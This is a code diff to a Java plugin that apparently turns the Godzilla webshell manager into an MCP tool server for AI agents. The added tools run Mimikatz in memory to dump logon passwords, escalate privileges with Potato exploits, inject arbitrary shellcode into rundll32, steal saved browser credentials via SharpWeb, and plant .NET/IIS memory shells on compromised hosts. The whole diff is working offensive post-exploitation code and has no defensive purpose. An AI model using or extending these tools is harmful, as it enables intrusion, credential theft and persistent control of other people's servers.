@@ -64,7 +64,7 @@ public class GodzillaMcpServerPlugin implements Plugin {
 
     private static final String PROTOCOL_VERSION = "2024-11-05";
     private static final String SERVER_NAME = "godzilla-mcp";
-    private static final String SERVER_VERSION = "1.3.0";
+    private static final String SERVER_VERSION = "1.4.0";
     private static final SimpleDateFormat LOG_DATE_FMT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
     private static PrintWriter logWriter = null;
 
@@ -782,7 +782,7 @@ public class GodzillaMcpServerPlugin implements Plugin {
                     strProp("targetUrl", "目标 Webshell 的 URL"), strProp("fpmAddress", "FPM 地址，如 127.0.0.1:9000 或 unix:///run/php-fpm.sock"),
                     strProp("scriptFile", "FPM 服务器上的脚本路径，如 /var/www/html/index.php"), strProp("code", "要执行的 PHP 代码（不含 <?php）")
             }, null)));
-            tools.add(buildToolDef("real_cmd", "虚拟终端-交互式命令执行（PHP/Java 载荷）。action=start 开启会话返回 sessionId；action=write 发送输入（输出随响应返回）；action=read 轮询输出；action=stop 结束；action=list 列出会话", buildSchemaEx(new String[][]{
+            tools.add(buildToolDef("real_cmd", "虚拟终端-交互式命令执行（PHP/Java/C# 载荷）。action=start 开启会话返回 sessionId；action=write 发送输入（输出随响应返回）；action=read 轮询输出；action=stop 结束；action=list 列出会话", buildSchemaEx(new String[][]{
                     strProp("action", "start / write / read / stop / list")
             }, new String[][]{
                     strProp("targetUrl", "目标 Webshell 的 URL（start 必填）"),
@@ -791,6 +791,41 @@ public class GodzillaMcpServerPlugin implements Plugin {
                     strProp("data", "write: 要发送的数据，如 \"ls -la\\n\""),
                     strProp("timeoutMs", "read: 等待输出的毫秒数（默认 2000）"),
                     strProp("sleepMs", "start: 建立会话的等待毫秒数（默认 1500）")
+            })));
+            tools.add(buildToolDef("mimikatz", "内存加载 Mimikatz（Java / C# 载荷）：内置 mimikatz PE 客户端侧转 shellcode 后目标内存中运行并回显", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, new String[][]{
+                    strProp("args", "mimikatz 参数（默认 \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"）"),
+                    strProp("command", "宿主进程命令行（可选，默认按位数自动选择 rundll32.exe）"),
+                    strProp("readWaitMs", "等待输出毫秒数（默认 6000）")
+            })));
+            tools.add(buildToolDef("petit_potam", "内存加载 EfsPotato 执行命令（Java / C# 载荷）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, new String[][]{
+                    strProp("args", "传给 PE 的参数（默认 cmd /c whoami）"),
+                    strProp("command", "宿主进程命令行（可选，默认按位数自动选择 rundll32.exe）"),
+                    strProp("readWaitMs", "等待输出毫秒数（默认 6000）")
+            })));
+            tools.add(buildToolDef("shellcode_load", "向目标内存加载执行 shellcode（Java / C# 载荷；hex 或本地文件二选一）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, new String[][]{
+                    strProp("hex", "shellcode 十六进制串（与 filePath 二选一）"),
+                    strProp("filePath", "shellcode 本地文件路径（与 hex 二选一）"),
+                    strProp("command", "宿主进程命令行（可选，默认按位数自动选择 rundll32.exe）"),
+                    strProp("readWaitMs", "等待输出毫秒数（默认 6000）")
+            })));
+            tools.add(buildToolDef("windows_privesc", "Windows 提权（C# 载荷）：variant=bad/sweet/efs/lemon，执行指定命令", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("variant", "bad / sweet / efs / lemon"), strProp("cmd", "要执行的命令（默认 whoami）")
+            }, new String[][]{
+                    strProp("clsid", "sweet 模式 CLSID（可选，有默认值）")
+            })));
+            tools.add(buildToolDef("sharp_web", "读取目标浏览器保存的密码/凭据（C# 载荷，内存加载 SharpWeb）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, null)));
+            tools.add(buildToolDef("csharp_memory_shell", "C# 内存马（.NET/IIS）：action=add 注入 / bypass_route / bypass_precompiled", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("password", "内存马密码"), strProp("key", "内存马密钥")
+            }, new String[][]{
+                    strProp("action", "add（默认）/ bypass_route / bypass_precompiled")
             })));
             result.add("tools", tools);
             return result;
@@ -948,6 +983,12 @@ public class GodzillaMcpServerPlugin implements Plugin {
                 case "php_bypass_disable_functions": resultText = phpBypassDisableFunctionsTool(arguments); break;
                 case "php_attack_fpm": resultText = phpAttackFpmTool(arguments); break;
                 case "real_cmd": resultText = realCmdTool(arguments); break;
+                case "mimikatz": resultText = mimikatzTool(arguments); break;
+                case "petit_potam": resultText = petitPotamTool(arguments); break;
+                case "shellcode_load": resultText = shellcodeLoadTool(arguments); break;
+                case "windows_privesc": resultText = windowsPrivescTool(arguments); break;
+                case "sharp_web": resultText = sharpWebTool(arguments); break;
+                case "csharp_memory_shell": resultText = csharpMemoryShellTool(arguments); break;
                 default:
                     throw new Exception("Unknown tool: " + toolName);
             }
@@ -1693,8 +1734,11 @@ public class GodzillaMcpServerPlugin implements Plugin {
             } else if ("java".equals(lang)) {
                 className = "plugin.JPortScan";
                 assetPath = "/shells/plugins/java/assets/JPortScan.classs";
+            } else if ("csharp".equals(lang)) {
+                className = "CProtScan.Run";
+                assetPath = "/shells/plugins/cshap/assets/CProtScan.dll";
             } else {
-                throw new Exception("port_scan 当前支持 Java / PHP 载荷（当前: " + p.getClass().getSimpleName() + "）");
+                throw new Exception("port_scan 当前支持 Java / PHP / C# 载荷（当前: " + p.getClass().getSimpleName() + "）");
             }
             if (!p.include(className, readResBytes(assetPath))) {
                 throw new Exception("端口扫描插件加载失败");
@@ -1823,8 +1867,11 @@ public class GodzillaMcpServerPlugin implements Plugin {
             } else if ("java".equals(lang)) {
                 className = "JZip";
                 assetPath = "/shells/plugins/java/assets/JZip.classs";
+            } else if ("csharp".equals(lang)) {
+                className = "CZip.Run";
+                assetPath = "/shells/plugins/cshap/assets/CZip.dll";
             } else {
-                throw new Exception("zip 当前支持 Java / PHP 载荷（当前: " + p.getClass().getSimpleName() + "）");
+                throw new Exception("zip 当前支持 Java / PHP / C# 载荷（当前: " + p.getClass().getSimpleName() + "）");
             }
             if (!p.include(className, readResBytes(assetPath))) {
                 throw new Exception(className + " 插件加载失败");
@@ -2119,8 +2166,11 @@ public class GodzillaMcpServerPlugin implements Plugin {
             } else if ("java".equals(lang)) {
                 className = "plugin.RealCmd";
                 assetPath = "/shells/plugins/java/assets/RealCmd.classs";
+            } else if ("csharp".equals(lang)) {
+                className = "RealCmd.Run";
+                assetPath = "/shells/plugins/cshap/assets/RealCmd.dll";
             } else {
-                throw new Exception("real_cmd 当前支持 PHP / Java 载荷（当前: " + p.getClass().getSimpleName() + "）");
+                throw new Exception("real_cmd 当前支持 PHP / Java / C# 载荷（当前: " + p.getClass().getSimpleName() + "）");
             }
             if (!p.include(className, readResBytes(assetPath))) {
                 throw new Exception("RealCmd 插件加载失败");
@@ -2242,6 +2292,194 @@ public class GodzillaMcpServerPlugin implements Plugin {
         if (res == null || res.length == 0) return "";
         if (res[0] == 5) return new String(res, 1, res.length - 1, StandardCharsets.UTF_8);
         return new String(res, StandardCharsets.UTF_8);
+    }
+
+    // ---------- Windows / .NET（C#）工具 ----------
+
+    /** 装载 shellcode loader：C#=AsmLoader.Run；Java=JarLoader(GodzillaJna.jar) + ShellcodeLoader */
+    private String ensureShellcodeLoader(Payload p) throws Exception {
+        final String lang = payloadLang(p);
+        if ("csharp".equals(lang)) {
+            if (!p.include("AsmLoader.Run", readResBytes("/shells/plugins/cshap/assets/AsmLoader.dll"))) {
+                throw new Exception("AsmLoader 加载失败");
+            }
+            return "AsmLoader.Run";
+        }
+        if ("java".equals(lang)) {
+            if (!p.include("plugin.JarLoader", readResBytes("/shells/plugins/java/assets/JarLoader.classs"))) {
+                throw new Exception("JarLoader 加载失败");
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("jarByteArray", readResBytes("/shells/plugins/java/assets/GodzillaJna.jar"));
+            String r = new String(p.evalFunc("plugin.JarLoader", "loadJar", rp), StandardCharsets.UTF_8).trim();
+            if (!"ok".equals(r)) {
+                throw new Exception("GodzillaJna.jar 装载失败: " + r);
+            }
+            if (!p.include("plugin.ShellcodeLoader", readResBytes("/shells/plugins/java/assets/ShellcodeLoader.classs"))) {
+                throw new Exception("ShellcodeLoader 加载失败");
+            }
+            return "plugin.ShellcodeLoader";
+        }
+        throw new Exception("该功能当前支持 Java / C# 载荷（当前: " + p.getClass().getSimpleName() + "）");
+    }
+
+    /** PE → 反射式 shellcode（客户端侧转换，与官方 ShellcodeLoader.runPe2 流程一致） */
+    private byte[] peToShellcode(byte[] pe) throws Exception {
+        StringBuilder log = new StringBuilder();
+        byte[] sc = shells.plugins.generic.PeLoader.peToShellcode(pe, log);
+        if (sc == null || sc.length == 0) {
+            throw new Exception("PE→shellcode 转换失败: " + log);
+        }
+        return sc;
+    }
+
+    /** 官方默认宿主进程（spawnto） */
+    private static String defaultSpawnto(Payload p) {
+        return p.isX64() ? "C:\\Windows\\System32\\rundll32.exe" : "C:\\Windows\\SysWOW64\\rundll32.exe";
+    }
+
+    /** 通过 loader 在目标内存执行 shellcode（参数与官方 runShellcode 一致） */
+    private String runShellcodeOn(Payload p, String loaderClass, String command, byte[] shellcode, int readWaitMs) throws Exception {
+        util.http.ReqParameter rp = new util.http.ReqParameter();
+        if (command == null || command.trim().isEmpty()) {
+            rp.add("type", "local");
+        } else {
+            rp.add("excuteFile", command);
+            rp.add("type", "start");
+        }
+        rp.add("shellcode", shellcode);
+        rp.add("readWaitTime", Integer.toString(readWaitMs));
+        return new String(p.evalFunc(loaderClass, "run", rp), StandardCharsets.UTF_8);
+    }
+
+    private String mimikatzTool(JsonObject a) throws Exception {
+        final String argsText = optString(a, "args", "\"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"");
+        final String commandOpt = optString(a, "command", null);
+        final int readWait = optInt(a, "readWaitMs", 6000);
+        return onTarget(a, p -> {
+            String loader = ensureShellcodeLoader(p);
+            byte[] pe = readResBytes("/shells/plugins/generic/assets/mimikatz-" + (p.isX64() ? "64" : "32") + ".exe");
+            byte[] sc = peToShellcode(pe);
+            String command = (commandOpt == null || commandOpt.trim().isEmpty()) ? defaultSpawnto(p) : commandOpt;
+            return runShellcodeOn(p, loader, command + " " + argsText, sc, readWait);
+        });
+    }
+
+    private String petitPotamTool(JsonObject a) throws Exception {
+        final String argsText = optString(a, "args", "cmd /c whoami");
+        final String commandOpt = optString(a, "command", null);
+        final int readWait = optInt(a, "readWaitMs", 6000);
+        return onTarget(a, p -> {
+            String loader = ensureShellcodeLoader(p);
+            byte[] pe = readResBytes("/shells/plugins/generic/assets/efsPotato-" + (p.isX64() ? "64" : "32") + ".exe");
+            byte[] sc = peToShellcode(pe);
+            String command = (commandOpt == null || commandOpt.trim().isEmpty()) ? defaultSpawnto(p) : commandOpt;
+            return runShellcodeOn(p, loader, command + " \"" + argsText + "\"", sc, readWait);
+        });
+    }
+
+    private String shellcodeLoadTool(JsonObject a) throws Exception {
+        final String hex = optString(a, "hex", null);
+        final String filePath = optString(a, "filePath", null);
+        final String commandOpt = optString(a, "command", null);
+        final int readWait = optInt(a, "readWaitMs", 6000);
+        return onTarget(a, p -> {
+            byte[] sc;
+            if (hex != null && !hex.trim().isEmpty()) {
+                sc = util.functions.hexToByte(hex.replaceAll("\\s+", ""));
+            } else if (filePath != null && !filePath.isEmpty()) {
+                sc = java.nio.file.Files.readAllBytes(new java.io.File(filePath).toPath());
+            } else {
+                throw new Exception("需要 hex 或 filePath 参数之一");
+            }
+            if (sc == null || sc.length == 0) {
+                throw new Exception("shellcode 数据为空");
+            }
+            String loader = ensureShellcodeLoader(p);
+            String command = (commandOpt == null || commandOpt.trim().isEmpty()) ? defaultSpawnto(p) : commandOpt;
+            return runShellcodeOn(p, loader, command, sc, readWait);
+        });
+    }
+
+    private String windowsPrivescTool(JsonObject a) throws Exception {
+        final String variant = optString(a, "variant", "bad").toLowerCase();
+        final String cmd = optString(a, "cmd", "whoami");
+        final String clsid = optString(a, "clsid", "4991D34B-80A1-4291-83B6-3328366B9097");
+        return onTarget(a, p -> {
+            if (!"csharp".equals(payloadLang(p))) {
+                throw new Exception("windows_privesc 仅支持 C# 载荷（当前: " + p.getClass().getSimpleName() + "）");
+            }
+            String className;
+            String asset;
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            if ("bad".equals(variant)) {
+                className = "BadPotato.Run";
+                asset = "/shells/plugins/cshap/assets/BadPotato.dll";
+                rp.add("cmd", cmd);
+            } else if ("sweet".equals(variant)) {
+                className = "SweetPotato.Run";
+                asset = "/shells/plugins/cshap/assets/SweetPotato.dll";
+                rp.add("cmd", cmd);
+                rp.add("clsid", clsid.getBytes(StandardCharsets.UTF_8));
+            } else if ("efs".equals(variant)) {
+                className = "EfsPotato.EfsPotato";
+                asset = "/shells/plugins/cshap/assets/EfsPotato.dll";
+                rp.add("cmd", cmd);
+            } else if ("lemon".equals(variant)) {
+                className = "Screen.Run";
+                asset = "/shells/plugins/cshap/assets/lemon.dll";
+            } else {
+                throw new Exception("未知 variant: " + variant + "（可选 bad/sweet/efs/lemon）");
+            }
+            if (!p.include(className, readResBytes(asset))) {
+                throw new Exception(className + " 加载失败");
+            }
+            return new String(p.evalFunc(className, "run", rp), StandardCharsets.UTF_8);
+        });
+    }
+
+    private String sharpWebTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> {
+            if (!"csharp".equals(payloadLang(p))) {
+                throw new Exception("sharp_web 仅支持 C# 载荷（当前: " + p.getClass().getSimpleName() + "）");
+            }
+            if (!p.include("SharpWeb.Run", readResBytes("/shells/plugins/cshap/assets/SharpWeb.dll"))) {
+                throw new Exception("SharpWeb 加载失败");
+            }
+            return new String(p.evalFunc("SharpWeb.Run", "run", new util.http.ReqParameter()), StandardCharsets.UTF_8);
+        });
+    }
+
+    private String csharpMemoryShellTool(JsonObject a) throws Exception {
+        final String password = requireParam(a, "password");
+        final String keyRaw = requireParam(a, "key");
+        final String action = optString(a, "action", "add");
+        return onTarget(a, p -> {
+            if (!"csharp".equals(payloadLang(p))) {
+                throw new Exception("csharp_memory_shell 仅支持 C# 载荷（当前: " + p.getClass().getSimpleName() + "）");
+            }
+            if (!p.include("memoryShell.Run", readResBytes("/shells/plugins/cshap/assets/memoryShell.dll"))) {
+                throw new Exception("memoryShell 加载失败");
+            }
+            if ("add".equals(action) || "addShell".equals(action)) {
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("password", password);
+                rp.add("key", util.functions.md5(keyRaw).substring(0, 16));
+                rp.add("action", "addShell");
+                return new String(p.evalFunc("memoryShell.Run", "addShell", rp), StandardCharsets.UTF_8);
+            }
+            if ("bypass_route".equals(action) || "bypassFriendlyUrlRoute".equals(action)) {
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("action", "bypassFriendlyUrlRoute");
+                return new String(p.evalFunc("memoryShell.Run", "bypassFriendlyUrlRoute", rp), StandardCharsets.UTF_8);
+            }
+            if ("bypass_precompiled".equals(action) || "bypassPrecompiledApp".equals(action)) {
+                util.http.ReqParameter rp = new util.http.ReqParameter();
+                rp.add("action", "bypassPrecompiledApp");
+                return new String(p.evalFunc("memoryShell.Run", "bypassPrecompiledApp", rp), StandardCharsets.UTF_8);
+            }
+            throw new Exception("未知 action: " + action + "（可选 add / bypass_route / bypass_precompiled）");
+        });
     }
 
     private Payload getOrInitPayload(String url) throws Exception {
